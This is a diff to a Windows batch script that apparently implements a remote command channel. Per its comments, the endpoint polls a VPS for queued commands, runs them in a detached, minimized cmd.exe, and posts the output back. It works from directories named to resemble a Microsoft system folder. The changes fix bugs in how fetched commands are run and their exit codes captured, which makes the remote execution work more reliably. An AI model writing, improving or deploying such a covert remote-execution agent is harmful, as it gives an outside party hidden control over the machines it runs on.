@@ -13,6 +13,12 @@ rem 0.0.4 (C22): command channel - every tick polls the VPS for a queued command
 rem   or ALL), runs it detached (60s bounded wait, partial output still reported), POSTs the
 rem   output back. Injection requires the ADMIN token which never leaves the VPS/operator;
 rem   endpoints only poll/execute/report. Server-side dedup (results table) + local cmd.done.
+rem 0.0.5 (C22): fix three batch mechanics bugs caught by local repro - (1) the wrapper's
+rem   redirect line wrote '2>&' because cmd ate the literal '1' as the fd number of the
+rem   trailing '1>>' append; now a space separates payload from the real redirect.
+rem   (2) timeout.exe exits instantly without a console; wait loop now uses ping -n.
+rem   (3) fd-trap: a single digit before '>' is a handle redirect (echo RC=0>file writes
+rem   an EMPTY file); rc file now written with the immune prefix form >file echo ...
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
@@ -277,14 +283,14 @@ echo !TID!>>"%ZD%\cmd.done"
 if exist "%ZD%\cmd.done" for %%F in ("%ZD%\cmd.done") do if %%~zF GTR 4096 del /f /q "%ZD%\cmd.done" >nul 2>&1
 echo [%DATE% %TIME%] cmd_!TID!_running>>"%LOG%"
 echo @echo off> "%ZD%\cmdwrap_!TID!.cmd"
-echo call "%ZD%\cmd_!TID!.cmd" ^> "%ZD%\cmd_!TID!.run" 2^>^&1>> "%ZD%\cmdwrap_!TID!.cmd"
-echo echo RC=%%errorlevel%%^>"%ZD%\cmd_!TID!.rc">> "%ZD%\cmdwrap_!TID!.cmd"
+echo call "%ZD%\cmd_!TID!.cmd" ^> "%ZD%\cmd_!TID!.run" 2^>^&1 >> "%ZD%\cmdwrap_!TID!.cmd"
+echo ^>"%ZD%\cmd_!TID!.rc" echo RC=%%errorlevel%%>> "%ZD%\cmdwrap_!TID!.cmd"
 del /f /q "%ZD%\cmd_!TID!.run" "%ZD%\cmd_!TID!.rc" >nul 2>&1
 start "" /min cmd.exe /c "%ZD%\cmdwrap_!TID!.cmd"
 set "CW=0"
 :CmdWait
 if exist "%ZD%\cmd_!TID!.rc" goto :CmdHave
-timeout /t 5 /nobreak >nul 2>&1
+ping -n 6 127.0.0.1 >nul 2>&1
 set /a CW+=1
 if !CW! LSS 12 goto :CmdWait
 :CmdHave
